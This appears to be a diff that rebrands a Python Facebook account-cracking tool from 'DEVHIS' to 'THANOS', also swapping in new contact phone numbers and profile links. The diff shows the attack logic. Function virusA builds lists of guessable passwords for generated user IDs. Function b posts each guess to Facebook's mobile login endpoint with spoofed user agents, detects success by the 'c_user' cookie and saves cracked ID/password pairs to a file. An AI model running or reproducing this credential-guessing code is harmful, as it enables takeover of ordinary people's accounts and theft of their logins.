@@ -1,4 +1,4 @@
-#HR1DOYE
+#SHANTO
 from bs4 import BeautifulSoup as sop
 from concurrent.futures import ThreadPoolExecutor as ThreadPool
 import os
@@ -81,7 +81,7 @@ loop = 0
 url_lookup = "https://lookup-id.com/"
 url_mb = "https://mbasic.facebook.com"
 url_ip = "https://www.httpbin.org/ip"
-header_grup = {"user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36;]"}
+header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 10; SM-N960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.166 Mobile Safari/537.36;]"}
 bulan_ttl = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "Augustus", "09": "September", "10": "October", "11": "November", "12": "December"}
 done = False
 ugen=[]
@@ -121,7 +121,7 @@ class jalan:
             sys.stdout.write(e)
             sys.stdout.flush()
             time.sleep(0.001)
-sys.stdout.write('\x1b[1;35m\x1b]2; DEVHIS Free Command \x07')
+sys.stdout.write('\x1b[1;35m\x1b]2; THANOS Free Command \x07')
 
 logo=("""
   \x1b[1;92m╔╗╔╗\033[0;33m╔══╗\033[0;34m╔══╗\033[0;35m╔══╗\033[0;31m╔═╦╗ \033[0;36m╔══╗\033[0;37m╔═╦═╗\x1b[1;92m╔══╗\033[0;31m╔═╦═╗
@@ -185,10 +185,10 @@ def Main():
 	if opt in ["B","2"]:
 		admin()
 	if opt in ["C","3"]:
-		os.system('xdg-open https://www.facebook.com/profile.php?id=100093402519904');time.sleep(1)
+		os.system('xdg-open https://www.facebook.com/hasan.imam.official');time.sleep(1)
 		fb()
 	if opt in ["D","4"]:
-		os.system('xdg-open https://wa.me/+8801780210942');time.sleep(1)
+		os.system('xdg-open https://wa.me/+8801700909089');time.sleep(1)
 		group()
 	if opt in ["0","0"]:
 		exit()
@@ -206,13 +206,13 @@ def admin():
 	print(' [0] Back to Main menu')
 	bal = input('Choose option >>> ')
 	if bal =='1':
-		os.system('xdg-open https://wa.me/+8801916564949');time.sleep(1)
+		os.system('xdg-open https://wa.me/+8801700909089');time.sleep(1)
 		admin()
 	if bal =='2':
-		os.system('xdg-open https://www.facebook.com/MDMehedi191');time.sleep(1)
+		os.system('xdg-open https://www.facebook.com/hasan.imam.official');time.sleep(1)
 		admin()
 	if bal =='3':
-		os.system('xdg-open https://github.com/Mr-DEVHIS-404');time.sleep(1)
+		os.system('xdg-open https://github.com/SHANTO-TC');time.sleep(1)
 		admin()
 	if bal =='0':
 		Main()
@@ -242,11 +242,11 @@ def virusA():
 		print(50*'━')
 		for guru in user:
 			uid = kode+koda+kodb+guru
-			pwx = [koda+kodb+guru,kodb+guru,kode+koda+kodb,kode+kode,kode+'123',kode+'1234','FREE FIRE','free fire','i love you','102030','203040','304050','405060','506070','607080','708090','jannat','Jannat','nusrat','Nusrat','sadiya','Sadiya']
+			pwx = [koda+kodb+guru,kodb+guru,kode+koda+kodb,kode+kode,kode+'123',kode+'1234','FREE FIRE','free fire','i love you','102030','203040','304050','405060','506070','607080','708090','sadiya','Sadiya']
 			yaari.submit(b,uid,pwx,tl)
 	print(50*'_')
 	print(' [💉] Crack process has been completed')
-	print(' [💉] Ids saved in ok.txt,cp.txt')
+	print(' [💉] Ids saved in THANOS-OK.txt')
 	print(50*'_')
 	exit()
 
@@ -258,7 +258,7 @@ def b(uid,pwx,tl):
     try:
         for ps in pwx:
             session = requests.Session()
-            sys.stdout.write(f'\r \033[1;90m[\033[1;93mDEVHIS\033[1;90m] \033[1;96m%s/%s\033[1;90m \033[1;90m[\033[1;92mOK:%s\033[1;90m] '%(loop,tl,len(oks))),
+            sys.stdout.write(f'\r \033[1;90m[\033[1;93mTHANOS\033[1;90m] \033[1;96m%s/%s\033[1;90m \033[1;90m[\033[1;92mOK:%s\033[1;90m] '%(loop,tl,len(oks))),
             sys.stdout.flush()
             pro = random.choice(ugen)
             #oo=random.choice(sss)
@@ -291,16 +291,16 @@ def b(uid,pwx,tl):
             'sec-fetch-site': 'none',
             'sec-fetch-user': '?1',
             'upgrade-insecure-requests': '1',
-            'user-agent': 'Mozilla/5.0 (Linux; Android 12; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',}
+            'user-agent': 'Mozilla/5.0 (Linux; Android 10; SM-N960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.166 Mobile Safari/537.36',}
             lo = session.post('https://p.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[65:80]
-                print(f'\r\33[1;92m [DEVHIS-OK] '+uid+' | '+ps+'\33[0;92m')
+                print(f'\r\33[1;92m [THANOS-OK] '+uid+' | '+ps+'\33[0;92m')
                 #print(f'\r\033[1;92m=[💚]=COOKIE : '+coki)
                 oks.append(cid)
-                open('/sdcard/DEVHIS-OK.txt', 'a').write(cid+' | '+ps+' | '+uid+'\n')
+                open('/sdcard/THANOS-OK.txt', 'a').write(cid+' | '+ps+' | '+uid+'\n')
                 break
             else:
                 continue
@@ -309,7 +309,7 @@ def b(uid,pwx,tl):
 
         pass
 def superuser():
-    UMO="DEVHIS-"
+    UMO="THANOS-"
     uuid = str(os.geteuid()) + str(os.getlogin()) 
     id = "5".join(uuid)
     print(logo)
